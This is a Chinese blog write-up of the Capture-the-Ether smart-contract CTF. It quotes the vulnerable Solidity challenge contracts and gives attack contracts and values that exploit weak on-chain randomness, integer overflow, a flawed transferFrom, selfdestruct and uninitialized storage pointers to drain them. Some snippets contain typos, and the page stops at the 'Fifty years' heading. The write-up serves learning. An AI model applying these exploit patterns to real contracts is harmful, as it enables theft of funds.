<!DOCTYPE html><html lang="zh_CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Capture-the-Ether | LexLady</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 共 $1 行","copy":"复制","copyFinish":"完成","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="LexLady" type="application/atom+xml">
</head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>Capture-the-Ether</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-01T13:48:19.000Z" id="date"> 2023-04-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-04-07T14:10:12.999Z" id="updated"> 2023-04-07</time></div></span></div></div><hr><div id="post-content"><p>由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助<br><del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del></p>
<span id="more"></span>
<h1 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h1><p>之后会通过图片将过程、结果上传</p>
<h2 id="Guess-Number"><a href="#Guess-Number" class="headerlink" title="Guess Number"></a>Guess Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>题目直接给出了答案，直接填<br><img src="/2023/04/01/Capture-the-Ether/GuessNumber_1.png"><img src="/2023/04/01/Capture-the-Ether/GuessNumber_2.png"><br>对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：</p>
<h2 id="The-Secret-Number"><a href="#The-Secret-Number" class="headerlink" title="The Secret Number"></a>The Secret Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    ---不同点---<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    function sol() public returns (uint8)&#123;<br>        for(uint8 i=0;i&lt;255;i++)&#123;<br>            if(keccak256(i)==<br>            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)<br>            &#123;retuen i;&#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>实现：<br><img src="/2023/04/01/Capture-the-Ether/SecNumber_1.png"><br><img src="/2023/04/01/Capture-the-Ether/SecNumber_2.png"><br>这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。</p>
<h2 id="The-Randon-Number"><a href="#The-Randon-Number" class="headerlink" title="The Randon Number"></a>The Randon Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        ---不同点---<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。<br>通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。 </p>
<h2 id="The-New-Number"><a href="#The-New-Number" class="headerlink" title="The New Number"></a>The New Number</h2><p>在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行调用guess方法，在攻击合约上生成的answer与在guess中生成的answer使用的是同一变量（block.number与now）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    GuessTheNewNumberChallenge gus;<br>    function attack(address _add) public&#123;<br>        gue = GuessTheNewNumberChallenge(_add);<br>    &#125;<br>    function att()public payable&#123;<br>        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        gue.guess.value(1 ether)(val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack&#123;<br>    PredictTheFutureChallenge pre;<br>    uint8 public answer=2;      <br>    function attack(address _add)public&#123;<br>        pre = PredictTheFutureChallenge(_add);<br>    &#125;<br>    function lock()public payable &#123;<br>        pre.lockInGuess.value(1 ether)(answer);<br>    &#125;<br>    function sol() public &#123;<br>        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(temp == answer)&#123;<br>            pre.settle();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。<br>因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）</p>
<h1 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h1><p>要求：转走合约中的余额</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>分析：因为合约的货币只有两个方法<code>sell()</code>、<code>buy()</code>，所以我们只有卖出比我们所购买的更多的货币才能达成<code>address(this).balance &lt; 1 ether</code>的条件。<br>在买入时有这么一个检查：<code>require(msg.value == numToken * PRICE_PER_TOKEN)</code>，因为<code>PRICE_PER_TOKEN</code>是一个不可修改的值，但可以通过与<code>numToken</code>的乘积进行溢出，从而绕过检查<br>uint256的最大值为2^256-1：<code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code><br>，所以该值除以10^18后添个一就是造成溢出的最小值：<code>115792089237316195423570985008687907853269984665640564039457 + 1</code><br>溢出的结果为<code>415992086870360064</code><br>所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战</p>
<h1 id="Token-Whale"><a href="#Token-Whale" class="headerlink" title="Token Whale"></a>Token Whale</h1><p>要求：拥有1,000,000的余额</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是<code>transferFrom()</code>函数中调用<code>_transfer()</code>不是在<code>from</code>和<code>to</code>之间的交易而是<code>msg.sender</code>和<code>to</code>之间的交易，这就是漏洞的关键<br>我们可以利用一份代理地址，玩家可以给代理地址分配任意的<code>allowance</code>，由代理地址向玩家和另一个地址进行<code>transferFrom()</code>，这样在执行<code>_transfer()</code>的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用<code>transfer()</code>转移给玩家就可以通过挑战了<br>大致流程<br>player：addr1<br>ToAccount：addr2<br>ProxyAccount：addr3  </p>
<ol>
<li>player.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  </li>
<li>ProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多</li>
<li>ProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址</li>
</ol>
<p><del>未在remix上测试</del></p>
<h1 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h1><p>源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。<br>攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过<strong>函数selfdestruct</strong><br>可参考Ethernaut 题8</p>
<h1 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h1><p>源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>之后再研究一下关于mapping通过key的hash运算来寻找对应值。</p>
<h1 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h1><p>要求：取走合约中的钱<br>源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）<br>在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。<br>因为<code>require(msg.value == etherAmount / scale)</code>这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。</p>
<p>实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getValut(uint256 amount) public pure returns (uint2565) &#123;<br>    return amount / 10**36;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2023/04/01/Capture-the-Ether/storage_structure_14.png"><br>通过计算得出msg.value的值为979192615699<br><img src="/2023/04/01/Capture-the-Ether/storage_structure_15.png"><br>在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。</p>
<h1 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h1><p>要求：<del>等到50年后</del>取走合约中的money<br>源代码：</p>
